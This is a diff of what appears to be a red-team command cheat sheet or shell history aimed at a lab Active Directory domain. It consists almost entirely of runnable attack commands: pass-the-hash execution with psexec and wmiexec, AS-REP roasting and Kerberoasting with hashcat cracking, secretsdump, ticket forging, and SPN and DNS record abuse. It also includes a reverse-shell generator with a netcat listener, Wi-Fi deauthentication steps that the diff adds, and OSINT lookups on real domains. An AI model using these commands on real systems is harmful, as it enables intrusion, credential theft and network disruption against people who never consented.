@@ -48,6 +48,7 @@ proxychains lsassy -d BREAKING.BAD -u Administrator -p 'p@ssword' SV01.BREAKING.
 psexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
 smbexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
 wmiexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
+wmiexec.py -codec cp850 -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
 atexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
 dcomexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
 dcomexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
@@ -115,14 +116,14 @@ kadimus --cookie 'PHPSESSID=qsh5s21mo54qds7v5384f1q34' -u 'http://192.168.10.10/
 shellerator --reverse-shell --ip 192.168.56.1 --port 1337 --type powershell
 shellerator
 rlwrap nc -lvnp 1337
-GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt BREAKING.BAD/
-GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt BREAKING.BAD/anonymous:anonymous
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip 192.168.56.101 BREAKING.BAD/
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip 192.168.56.101 BREAKING.BAD/anonymous:anonymous
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -usersfile users.txt -dc-ip 192.168.56.101 BREAKING.BAD/
-GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 -dc-ip 192.168.56.101 BREAKING.BAD/Administrator
 hashcat -m 18200 -a 0 ASREProastables.txt `fzf-wordlists`
 john --wordlist=`fzf-wordlists` ASREProastables.txt
-GetUserSPNs.py -outputfile Kerberoastables.txt BREAKING.BAD/anonymous:anonymous
-GetUserSPNs.py -outputfile Kerberoastables.txt -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator
+GetUserSPNs.py -outputfile Kerberoastables.txt -dc-ip 192.168.56.101 BREAKING.BAD/anonymous:anonymous
+GetUserSPNs.py -outputfile Kerberoastables.txt -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 -dc-ip 192.168.56.101 BREAKING.BAD/Administrator
 hashcat -m 13100 kerberoastables.txt `fzf-wordlists`
 john --format=krb5tgs --wordlist=`fzf-wordlists` kerberoastables.txt
 polenum -u anonymous -p anonymous -d BREAKING.BAD
@@ -141,11 +142,10 @@ ticketer.py -nthash 0123456789krbtgtnthash0123456789 -domain-sid S-1-5-11-391295
 export KRB5CCNAME=randomuser.ccache
 secretsdump -k SV01.BREAKING.BAD
 hashcat -m 1000 --potfile-path BREAKING.BAD.ntds.cracked BREAKING.BAD.ntds --show --username --outfile-format 3
-cme ldap 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --asreproast ASREProastables.txt
 cme ldap 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --asreproast ASREProastables.txt --kdcHost 192.168.56.101
-cme ldap 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --kerberoasting kerberoastables.txt
+cme ldap 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --kerberoasting kerberoastables.txt --kdcHost 192.168.56.101
 crackmapexec ldap 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --asreproast ASREProastables.txt --kdcHost 192.168.56.101
-crackmapexec ldap 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --kerberoasting kerberoastables.txt
+crackmapexec ldap 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --kerberoasting kerberoastables.txt --kdcHost 192.168.56.101
 ldapsearch -x -h 192.168.56.101 -D '' -w '' -b "dc=BREAKING,dc=BAD"
 addspn.py -u 'BREAKING\SV01$' -p aad3b435b51404eeaad3b435b51404ee:c1c635aa12ae60b7fe39e28456a7bac6 -s HOST/SHUTDOWN.BREAKING.BAD --additional DC01.BREAKING.BAD
 dnstool.py -u 'BREAKING\SV01$' -p aad3b435b51404eeaad3b435b51404ee:c1c635aa12ae60b7fe39e28456a7bac6 -r SHUTDOWN.BREAKING.BAD -d 192.168.56.1 --action add DC01.BREAKING.BAD
@@ -219,6 +219,10 @@ hcxpcapngtool --all -o dump.hashcat dump.pcapng
 hashcat -m 22000 dump.hashcat `fzf-wordlists`
 responder --interface eth0 --analyze --lm
 ntlmv1-multi --ntlmv1 SV01$::BREAKING.BAD:AD1235DEAC142CD5FC2D123ADCF51A111ADF45C2345ADCF5:AD1235DEAC142CD5FC2D123ADCF51A111ADF45C2345ADCF5:1122334455667788
+airmon-ng start wlan1
+airodump-ng wlan1
+airodump-ng -c 1 wlan1
+aireplay-ng --deauth 10 -a TR:GT:AP:BS:SS:ID wlan1
 sublist3r -v -d example.com
 subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl
 holehe test@gmail.com
@@ -244,4 +248,3 @@ cloudfail.py --target seo.com --tor
 assetfinder google.com
 subfinder -d freelancer.com
 theHarvester -d github.com -b all
-ghunt test@gmail.com
